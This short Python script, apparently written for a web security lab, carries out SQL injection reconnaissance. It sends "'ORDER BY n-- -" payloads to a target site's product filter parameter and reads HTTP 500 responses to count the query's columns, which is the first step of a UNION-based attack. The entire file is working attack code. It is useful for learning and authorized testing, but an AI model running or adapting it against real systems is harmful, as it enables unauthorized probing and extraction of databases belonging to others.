import requests
from urllib.parse import quote as encode
from bs4 import BeautifulSoup
import sys
url = f"{sys.argv[1]}/filter?category=Gifts"

def count_colums():
    for count in range(1,10):
        # count columes numbers
        payload = f"'ORDER+BY+{count}--+-"
        full = url+payload
        resp = requests.get(full)
        if resp.status_code != 500:
            print(f"Found Colume Count: {count}")
        elif  resp.status_code == 500:
            return count - 1